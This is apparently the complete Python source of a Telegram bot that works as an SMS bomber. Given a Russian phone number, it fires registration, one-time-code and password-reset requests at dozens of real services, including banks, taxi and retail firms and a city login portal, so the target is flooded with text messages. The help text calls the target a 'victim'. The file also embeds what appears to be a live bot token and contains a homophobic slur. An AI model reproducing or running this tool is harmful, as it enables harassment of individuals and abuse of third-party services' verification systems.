
# -*- coding: utf-8 -*-
import telebot, requests, random, datetime, sys, time, argparse
from telebot import types
bot = telebot.TeleBot("965521501:AAHYwmNj3gR4xbJTDH9HsZkme0kObgrwI3o")
@bot.message_handler(commands=['start']) 
def handle_start(message): 
	bot.reply_to(message, 'Привет, ' + message.from_user.first_name + '\nОтправь мне номер телефона в формате 79xxxxxxxxx')

@bot.message_handler(commands=['help']) 
def handle_start(message): 
	bot.reply_to(message, 'Привет!\nОтправляешь боту номер телефона в формате 79xxxxxxxxx, а он спамит жертву.\nВсё просто!\nВсе вопросы к @FSystem88\nКанал: @spymer')

@bot.message_handler(func=lambda message: True, content_types=['text']) 
def handle_text(message): 

	_phone = message.text
	if _phone[0] == "7":
		bot.send_message(message.from_user.id, "Запуск начался")
		_text = 'Путин тебя любит ♥'
		_name = ''
		for x in range(12):
			_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		_phone9 = _phone[1:]
		_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #915+350-99-08
		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
		iteration = 0
		_email = _name+f'{iteration}'+'@gmail.com'
		grab = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'})
		rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
		belka = requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
		tinder = requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
		vkusvill = requests.post('https://mobile.vkusvill.ru:40113/api/user/', data={'Phone_number': _phone9,'version': '2'}, headers={})
		karusel = requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
		uramobil = requests.post('https://service.uramobil.ru/profile/smstoken', data={'PhoneNumber': _phone}, headers={})
		taxiseven = requests.post('http://taxiseven.ru/auth/register', data={'phone': _phone}, headers={})
		dostavista = requests.post('https://dostavista.ru/backend/send-verification-sms', data={'phone': _phone9dostavista}, headers={})
		tinkoff = requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
		worki = requests.post('https://api.iconjob.co/api/web/v1/verification_code', data={"phone": _phone}, headers={})
		wildberries = requests.post('https://security.wildberries.ru/mobile/requestconfirmcode?forAction=RegisterUser', data={"phone": '+'+_phone}, headers={})
		mts = requests.post('https://api.mtstv.ru/v1/users', data={'msisdn': _phone}, headers={})
		ostin = requests.get('https://ostin.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.js', data={'type':'sendConfirmCode', 'phoneNumber': _phoneOstin})
		ostin = requests.post('https://ostin.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp', params={'type': 'sendConfirmCode', 'phoneNumber': _phone})
		youla = requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
		youdrive = requests.post('http://youdrive.today/signup/phone', data={'phone': _phone, 'phone_code':'7'})
		pizzahut = requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
		rabota = requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
		drugvokrug = requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data={'cell': _phone})
		rutube = requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
		wifimetro = requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone})
		arambaa = requests.post('http://www.aramba.ru/core.php', data={'act': 'codeRequest', 'phone': '+'+_phone, 'l': _name, 'p': _name, 'name': _name, 'email': _name + '@gmail.com'})
		citilink = requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone, data={})
		dozarplati = requests.post('https://online-api.dozarplati.com/rpc', json={'id': 1, 'jsonrpc': '2.0', 'method': 'auth.login', 'params': {'phoneNumber': _phone}})
		fastmoney = requests.post('https://fastmoney.ru/auth/registration', data={'RegistrationForm[username]': '+' + _phone, 'RegistrationForm[password]': '12345', 'RegistrationForm[confirmPassword]': '12345', 'yt0': 'Регистрация'})
		findclone = requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		pmsm = requests.post('https://ube.pmsm.org.ru/esb/iqos-reg/submission', json={'data': {'firstName': _text, 'lastName': '***', 'phone': _phone, 'email': _name+'@gmail.com', 'password': _name, 'passwordConfirm': _name}})
		smsint = requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _text,'phone': _phone})
		lenta = requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
		maxidom = requests.get('https://www.maxidom.ru/ajax/doRegister.php', params={'send_code_again': 'Y', 'phone': _phone, 'email': _name+'@gmail.com', 'code_type': 'phone'})
		mcdonalds = requests.post('https://mcdonalds.ru/api/auth/code', json={'phone': '+' + _phone})
		oyorooms = requests.post('https://www.oyorooms.com/api/pwa/generateotp', params={'phone': _phone[1:], 'country_code': '+' + _phone})
		pswallet = requests.get('https://api.pswallet.ru/system/smsCode', params={'mobile': _phone, 'type': '0'})
		privetmir = requests.post('https://api-user.privetmir.ru/api/send-code', data={'approve1': 'on', 'approve2': 'on', 'checkApproves': 'Y', 'checkExist': 'Y','login': _phone, 'scope': 'register-user'})
		mvideo = requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode', params={'pageName': 'registerPrivateUserPhoneVerification'}, data={'phone': _phone})
		newnext = requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
		optima = requests.post('https://online.optima.taxi/user/get-code', data={'phone': _phone})
		s7 = requests.get('https://www.s7.ru/dotCMS/priority/ajaxEnrollment',params={'dispatch': 'shortEnrollmentByPhone', 'mobilePhone.countryCode': '7','mobilePhone.areaCode': _phone[1:4], 'mobilePhone.localNumber': _phone[4:-1]})
		sunlight = requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
		managevoximplant = requests.post('https://api-ru-manage.voximplant.com/api/AddAccount',data={'region': 'eu', 'account_name': _name, 'language_code': 'en','account_email': _name + '@gmail.com', 'account_password': _name})
		voximplant = requests.post('https://api-ru-manage.voximplant.com/api/SendActivationCode',data={'phone': _phone, 'account_email': _name + '@gmail.com'})
		gorzdrav = requests.post('https://gorzdrav.org/login/register/sms/send', data={'phone': _phoneGorzdrav, 'CSRFToken': '*'})
		loginmos = requests.post('https://login.mos.ru/sps/recovery/start', json={'login': _phone, 'attr': ''})
		alpari = requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
		invitro = requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
		onlinesbis = requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
		psbank = requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
		raiffeisen = requests.get('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code', params={'number':_phone})
		beltelecom = requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
		utair = requests.post('https://b.utair.ru/api/v1/login/', json={"login":_phone})
		aresbank = requests.post('https://www.aresbank.ru/ajax/register.php', data={'REGISTER[NAME]': 'Иванов Иван Иванович','REGISTER[PERSONAL_PHONE]': _phoneAresBank,'REGISTER[LOGIN]': _name+f'{iteration}','REGISTER[PASSWORD]': _name+'-/'+_name,'REGISTER[CONFIRM_PASSWORD]': _name+'-/'+_name,'REGISTER[ACTION]': 'register','register_submit_button': 'Регистрация'})
		modulbank = requests.post('https://my.modulbank.ru/api/v2/registration/nameAndPhone', json={'FirstName':'Саша','CellPhone':_phone9,'Package':'optimal'})
		sfera = requests.post('https://sfera.ru/api/quiz/id', json={"phone":_phonePizzahut,"regno":"1021400692048"})
		bystrobank = requests.post('https://www.bystrobank.ru/publogin/web/register.php', data={'referer::-0':'','realm::-0':'bbpwd','loginName-0':_name,'password::-0':_name,'passwordRepeat::-0':_name,'phoneNumber::-0':_phone9,'ruPhoneCheck::-0':'true','email::-0':_email,'registration':'','serviceName-0':'lc'})

		bot.send_message(message.from_user.id, "GOOD!")

	elif message.text == "Юра пидр" or message.text == "Юра пидор": 
		bot.send_message(message.from_user.id, "I'm fine, thanks!♥") 
	else: 
		bot.send_message(message.from_user.id, "Sorry, i dont understand you.")
	





bot.polling()
